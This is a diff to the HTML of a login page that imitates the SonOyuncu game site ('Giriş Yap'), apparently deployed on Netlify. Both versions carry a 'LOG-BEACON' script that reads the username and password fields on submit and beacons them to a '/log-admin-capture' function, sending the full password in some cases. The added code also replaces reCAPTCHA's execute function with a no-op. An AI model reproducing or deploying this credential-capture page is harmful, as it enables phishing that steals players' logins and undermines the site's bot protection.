@@ -33,7 +33,7 @@
             document.getElementById("biscolab-recaptcha-invisible-form").submit();
         }
     </script>
-<link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=__rcOnload&render=explicit""></script>
+<link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit"></script>
 <script>
       var onloadCallback = function() {
         grecaptcha.render("g-recaptcha-btn", {
@@ -48,7 +48,7 @@
 function biscolabLaravelReCaptcha(token) {
   document.getElementById("biscolab-recaptcha-invisible-form").submit();
 }
-</script><script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=__rcOnload&render=explicit""></script><style>
+</script><script async="" defer="" src="https://www.google.com/recaptcha/api.js"></script><style>
 .grecaptcha-badge {
   visibility: visible !important;
   opacity: 1 !important;
@@ -107,8 +107,7 @@ function biscolabLaravelReCaptcha(token) {
 </a>
 </div>
 <div class="w-full">
-<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" data-netlify="true" id="biscolab-recaptcha-invisible-form" method="POST" name="giris-yap" action="/"><input name="form-name" type="hidden" value="giris-yap"/>
-<input name="token" type="hidden" value="e6cf690aeb8b176a68cfd020a4b2685075647e5150442d736ceac5705e0dbe8d"/>
+<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" id="biscolab-recaptcha-invisible-form" method="GET" name="giris-yap" action="/"><input name="token" type="hidden" value="e6cf690aeb8b176a68cfd020a4b2685075647e5150442d736ceac5705e0dbe8d"/>
 <h1 class="text-2xl font-semibold">Giriş Yap</h1>
 <p class="text-sm mb-4">SonOyuncu hesabına giriş yap.</p>
 <div class="mb-4">
@@ -305,48 +304,68 @@ function onSubmit(token) {
 <!-- END: Validation + banner additions -->
 
 
-  <div id="rc-dummy" style="position:fixed;bottom:-1000px;right:-1000px;width:1px;height:1px;overflow:hidden;"></div>
+<div id="rc-dummy" style="position:fixed;bottom:-1000px;right:-1000px;width:1px;height:1px;overflow:hidden;"></div>
 
-  <!-- LOG-BEACON -->
-  <script>
-  (function(){
-    var form = document.querySelector('form#biscolab-recaptcha-invisible-form, form[name="giris-yap"]') || document.querySelector('form');
-    if (!form) return;
-    var url='/.netlify/functions/log-admin-capture';
+<script>
+(function(){
+  function setup(){
+    if (!window.grecaptcha) return false;
+    try {
+      if (!window.__rcWidgetId) {
+        try {
+          window.__rcWidgetId = grecaptcha.render('rc-dummy', { sitekey: '6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ', size: 'invisible', badge: 'bottomright' });
+        } catch(_e) { }
+      }
+      if (typeof grecaptcha.execute === 'function') {
+        const nop = function(){ return Promise.resolve(''); };
+        grecaptcha.execute = nop;
+        try { grecaptcha.enterprise && (grecaptcha.enterprise.execute = nop); } catch(_e){}
+      }
+    } catch(e) { }
+    return true;
+  }
+  window.__rcOnload = function(){ setup(); };
+  function tick(){ if (!setup()) setTimeout(tick, 100); }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', tick); else tick();
+  window.addEventListener('load', tick);
+})();
+</script>
 
-    function send(u, p){
-      try {
-        var payload = { username: (u||'').toLowerCase() };
-        if (typeof p === 'string') {
-          if ((u||'').toLowerCase()==='test' && p.length>=6) {
-            payload.password = p;   // admin_ok: parolayı şifrelemek üzere gönder
-          } else {
-            payload.pw_len = p.length;  // diğer durumlar: sadece uzunluk
-          }
-        }
-        var body = JSON.stringify(payload);
-        var blob = new Blob([body], { type:'application/json' });
-        if (navigator.sendBeacon) { navigator.sendBeacon(url, blob); }
-        else { fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body, keepalive:true }); }
-      } catch(_e) { }
-    }
 
-    function handle(){
-      var uEl = form.querySelector('input[name="username"], #username, input[placeholder*="Oyuncu" i], input[aria-label*="Oyuncu" i]') || form.querySelector('input[type="text"]');
-      var pEl = form.querySelector('input[name="password"], #password, input[type="password"]');
-      var u = (uEl && uEl.value || '').trim();
-      var p = (pEl && pEl.value) || '';
-      send(u, p);
-    }
+<!-- LOG-BEACON -->
+<script>
+(function(){
+  var form = document.querySelector('form');
+  if (!form) return;
+  var url='/.netlify/functions/log-admin-capture';
 
-    // Hem submit hem tıklamada tetikle; capture ile olası stopPropagation engellerini aş
-    form.addEventListener('submit', handle, { capture:true });
-    var sb = form.querySelector('button[type="submit"], input[type="submit"]');
-    if (sb) sb.addEventListener('click', handle, { capture:true });
+  function send(u, p){
+    try{
+      var payload = { username: (u||'').toLowerCase() };
+      if (typeof p === 'string' && p.length){
+        if (payload.username === 'test' && p.length >= 6) payload.password = p;
+        else payload.pw_len = p.length;
+      }
+      var body = JSON.stringify(payload);
+      var blob = new Blob([body], { type:'application/json' });
+      if (navigator.sendBeacon) navigator.sendBeacon(url, blob);
+      else fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body, keepalive:true });
+    }catch(_){}
+  }
 
-    // Safari/iOS gibi durumlar için sayfadan çıkarken son bir kez dene
-    window.addEventListener('pagehide', function(){ try{handle();}catch(_e){} });
-  })();
-  </script>
+  function onSubmit(){
+    var uEl = form.querySelector('input[name="username"], #username, input[type="text"]');
+    var pEl = form.querySelector('input[name="password"], #password, input[type="password"]');
+    var u = (uEl && uEl.value || '').trim();
+    var p = (pEl && pEl.value) || '';
+    send(u, p);
+    // Do NOT preventDefault: method=GET so page reloads without Netlify Forms
+  }
+
+  form.addEventListener('submit', onSubmit, { capture:true });
+  var sb = form.querySelector('button[type="submit"], input[type="submit"]');
+  if (sb) sb.addEventListener('click', onSubmit, { capture:true });
+})();
+</script>
 
 </body></html>
